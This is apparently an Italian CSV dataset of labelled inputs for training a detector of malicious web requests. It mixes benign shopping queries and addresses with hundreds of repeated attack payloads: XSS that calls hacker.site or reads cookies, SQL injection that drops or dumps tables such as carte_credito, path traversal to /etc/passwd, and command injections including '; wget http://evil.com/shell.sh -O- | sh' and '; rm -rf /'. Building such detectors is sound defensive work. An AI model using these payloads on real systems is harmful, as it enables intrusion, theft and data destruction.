testo,etichetta
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE carte_credito; --,1
../../../../../../../../etc/passwd,1
<script>fetch('http://hacker.site')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
compra giacca online in offerta,0
../../../../../../../etc/passwd,1
<script>alert('pwned')</script>,1
..%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco orologio blu taglia 41,0
compra orologio online in offerta,0
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert(document.cookie)"">",1
../../../../../../etc/passwd,1
biscotti integrali senza zucchero,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<script>fetch('http://hacker.site')</script>,1
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
cerco orologio verde taglia 41,0
compra scarpe online in offerta,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
../../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra maglietta online in offerta,0
../../../../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
compra pantaloni online in offerta,0
'; DROP TABLE utenti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra felpa online in offerta,0
"Corso Italia 66, Palermo",0
<script>alert('pwned')</script>,1
cerco pantaloni grigio taglia 42,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
'; DROP TABLE admin; --,1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""alert('pwned')"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra orologio online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra maglietta online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""fetch('http://hacker.site')"">",1
compra maglietta online in offerta,0
"Via Milano 208, Genova",0
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
""";alert(1)//",1
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco scarpe giallo taglia S,0
javascript:alert(document.domain),1
'; DROP TABLE config; --,1
'; DROP TABLE config; --,1
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
'; DROP TABLE sessions; --,1
'; DROP TABLE clienti; --,1
"Corso Italia 165, Roma",0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../../../../etc/passwd,1
'; DROP TABLE utenti; --,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert('pwned')"">",1
compra felpa online in offerta,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"Via Milano 118, Bologna",0
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"<svg onload=""alert(document.cookie)"">",1
cerco pantaloni blu taglia 43,0
'; DROP TABLE config; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco orologio grigio taglia XL,0
'; DROP TABLE clienti; --,1
"Via Dante 236, Torino",0
compra felpa online in offerta,0
"Corso Italia 76, Milano",0
cerco felpa verde taglia 44,0
'; DROP TABLE clienti; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE clienti; --,1
<script>fetch('http://hacker.site')</script>,1
"Via Garibaldi 197, Firenze",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"Via dei Mille 8, Napoli",0
../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE clienti; --,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert('pwned')"">",1
../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
"Via Dante 107, Palermo",0
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE config; --,1
../../../../../etc/passwd,1
cerco maglietta rosso taglia 43,0
"<svg onload=""alert(document.cookie)"">",1
compra maglietta online in offerta,0
"<svg onload=""alert('pwned')"">",1
<script>alert(document.cookie)</script>,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2fvar/www/html/config.php,1
<script>fetch('http://hacker.site')</script>,1
compra giacca online in offerta,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Milano 235, Milano",0
../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Roma 222, Firenze",0
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
cerco giacca nero taglia XL,0
"<svg onload=""fetch('http://hacker.site')"">",1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
compra zaino online in offerta,0
compra felpa online in offerta,0
compra pantaloni online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
"Corso Italia 204, Napoli",0
../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
compra pantaloni online in offerta,0
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../../../etc/passwd,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE config; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra pantaloni online in offerta,0
cerco pantaloni blu taglia 41,0
../../../../../etc/passwd,1
<input type='text' value='XSS' onfocus='alert(1)'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE carte_credito; --,1
compra zaino online in offerta,0
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE carte_credito; --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
cerco orologio blu taglia L,0
'; DROP TABLE carte_credito; --,1
../../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
`id`,1
cerco maglietta blu taglia 44,0
../../../../../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
'; DROP TABLE utenti; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE config; --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra felpa online in offerta,0
../../../etc/passwd,1
"<svg onload=""alert(document.cookie)"">",1
"Via Dante 3, Milano",0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Milano 85, Roma",0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
'; DROP TABLE sessions; --,1
compra pantaloni online in offerta,0
"Corso Italia 63, Firenze",0
..%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>alert('pwned')</script>,1
'; DROP TABLE carte_credito; --,1
vestito estivo a fiori,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
cerco giacca nero taglia M,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco maglietta grigio taglia S,0
<script>fetch('http://hacker.site')</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
../../../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 235, Roma",0
<script>fetch('http://hacker.site')</script>,1
<script>alert('pwned')</script>,1
compra pantaloni online in offerta,0
cerco maglietta verde taglia M,0
'; DROP TABLE admin; --,1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco scarpe verde taglia 41,0
cerco pantaloni nero taglia S,0
../../../../../../etc/passwd,1
"<svg onload=""alert(document.cookie)"">",1
compra maglietta online in offerta,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<script>alert(document.cookie)</script>,1
compra felpa online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"<svg onload=""fetch('http://hacker.site')"">",1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../etc/passwd,1
cerco felpa bianco taglia L,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE carte_credito; --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE admin; --,1
"Via Mazzini 189, Napoli",0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<script>alert('pwned')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../../../etc/passwd,1
<script>fetch('http://hacker.site')</script>,1
"Corso Italia 135, Milano",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
; wget http://evil.com/shell.sh -O- | sh,1
cerco maglietta bianco taglia 42,0
compra felpa online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM config --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Garibaldi 21, Firenze",0
cerco felpa grigio taglia L,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE carte_credito; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra pantaloni online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE admin; --,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE config; --,1
"<svg onload=""alert(document.cookie)"">",1
"Via Milano 15, Palermo",0
<script>fetch('http://hacker.site')</script>,1
<script>alert('pwned')</script>,1
<script>alert('pwned')</script>,1
"Via Garibaldi 97, Palermo",0
voglio modificare il mio profilo,0
../../../etc/passwd,1
"Via Roma 25, Napoli",0
cerco giacca grigio taglia 43,0
' OR 1=1 #,1
../../../../../../../etc/passwd,1
compra scarpe online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Dante 107, Bologna",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra maglietta online in offerta,0
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""alert('pwned')"">",1
offerte della settimana,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE carte_credito; --,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""fetch('http://hacker.site')"">",1
compra orologio online in offerta,0
<script>alert('pwned')</script>,1
compra giacca online in offerta,0
"<svg onload=""alert(document.cookie)"">",1
'; DROP TABLE clienti; --,1
"Via Milano 116, Milano",0
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
<script>fetch('http://hacker.site')</script>,1
compra pantaloni online in offerta,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Mazzini 202, Firenze",0
'; DROP TABLE sessions; --,1
../../../../../../../../etc/passwd,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
"Via Garibaldi 108, Torino",0
../../../../etc/passwd,1
"Via Roma 167, Roma",0
'; DROP TABLE sessions; --,1
compra scarpe online in offerta,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Roma 101, Firenze",0
; rm -rf /,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco scarpe rosso taglia 42,0
cerco orologio bianco taglia 41,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
..%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<iframe src='javascript:alert(1)'>,1
"Via Milano 222, Firenze",0
<script>fetch('http://hacker.site')</script>,1
../../../etc/passwd,1
occhiali da sole polarizzati,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
compra maglietta online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
"Via Mazzini 38, Genova",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
cerco scarpe nero taglia L,0
cerco orologio verde taglia XL,0
'; DROP TABLE admin; --,1
"<svg onload=""alert(document.cookie)"">",1
cerco scarpe blu taglia 44,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
compra felpa online in offerta,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
../../../../../etc/passwd,1
'; DROP TABLE sessions; --,1
compra pantaloni online in offerta,0
../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
../../../../../etc/passwd,1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
cerco orologio bianco taglia L,0
<script>fetch('http://hacker.site')</script>,1
../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
../../../etc/passwd,1
cerco orologio grigio taglia M,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
compra pantaloni online in offerta,0
'; DROP TABLE admin; --,1
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
<script>alert('pwned')</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra orologio online in offerta,0
cerco maglietta giallo taglia XL,0
<script>fetch('http://hacker.site')</script>,1
<script>alert(document.cookie)</script>,1
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Mazzini 161, Palermo",0
cerco scarpe rosso taglia 41,0
cerco giacca rosso taglia XL,0
../../../../../etc/passwd,1
../../../../../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""fetch('http://hacker.site')"">",1
<script>alert('pwned')</script>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2fvar/www/html/config.php,1
<script>alert('pwned')</script>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE carte_credito; --,1
compra zaino online in offerta,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
cerco felpa bianco taglia L,0
"Via Dante 189, Firenze",0
"Via Roma 122, Napoli",0
..%2f%2f%2fvar/www/html/config.php,1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE admin; --,1
compra scarpe online in offerta,0
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"<svg onload=""alert('pwned')"">",1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"Via Garibaldi 56, Genova",0
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2fvar/www/html/config.php,1
"Via Roma 184, Palermo",0
